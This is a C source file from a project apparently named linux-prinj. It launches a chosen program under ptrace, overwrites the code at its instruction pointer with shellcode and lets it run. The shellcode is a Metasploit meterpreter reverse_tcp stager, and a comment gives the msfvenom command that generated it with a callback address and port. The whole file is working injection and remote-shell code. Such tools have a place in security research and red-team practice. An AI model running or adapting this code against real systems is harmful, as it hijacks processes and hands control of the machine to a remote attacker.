/*
 * This file is part of the linux-prinj project.
 * Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>

#include "../common/ptrace_utils.h"
#include "../common/utils.h"


// Generated through: msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.100.1 LPORT=4444 -f c
unsigned char shellcode[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x11\x5c\xc0\xa8\x64\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";


unsigned int sc_len = 130;

int main(int argc, const char* const* argv)
{
    pid_t pid;
    struct user_regs_struct regs;

    if (argc != 2) {
        fprintf(stderr, "usage: %s <executable>\n", argv[0]);
        fprintf(stderr, "example: %s /bin/ls\n", argv[0]);
        return 1;
    }

    const char *prog_name = argv[1];
    char *params[] = { prog_name, NULL };    
    
    switch ((pid = fork())) {
    case -1:
        perror("Failed to fork");
        return 1;
    case 0: 
        /* attach to child */
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("Failed to attach to child");
            _exit(1);
        }
        execve(prog_name, params, NULL);
        perror("Failed to launch executable");
        _exit(1);
    default: /* parent */
        break;
    }

    /* Wait for the process to be stopped (under our control). */
    if (waitpid(pid, 0, 0) != pid) {
        perror("Failed waiting for target process");
        return 1;
    }

    /* Get the target process's current registers. */
    if (ptrace(PTRACE_GETREGS, pid, 0, &regs) != 0) {
        perror("Failed to read registers");
        return 1;
    }

    unsigned long shellcode_addr = regs.rip;

    /* Write shellcode. */
    if (ptrace_write(pid, shellcode_addr, shellcode, sc_len) != 0) {
        perror("Failed to write shellcode to memory");
        return 1;
    }


    printf("[+] Shellcode injected at 0x%lx (%d bytes)\n", shellcode_addr, sc_len);
    printf("[+] Detaching...\n");
    
    /* Let the target process execute normally. */
    if (ptrace(PTRACE_DETACH, pid, 0, 0) != 0) {
        perror("Failed to detach process");
        return 1;
    }

    printf("Run 'ps aux | grep %s' to verify.\n", argv[1]);

    return 0;
}
